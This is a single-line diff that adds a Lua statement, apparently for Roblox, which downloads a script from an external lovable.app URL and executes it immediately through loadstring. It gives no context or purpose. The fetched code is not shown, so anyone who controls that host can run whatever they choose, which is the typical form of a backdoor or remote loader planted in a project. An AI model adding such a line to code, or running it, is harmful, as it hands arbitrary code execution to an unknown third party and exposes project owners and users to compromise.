@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://luaprotecterr.lovable.app/api/public/s/edXQZ9U"))()
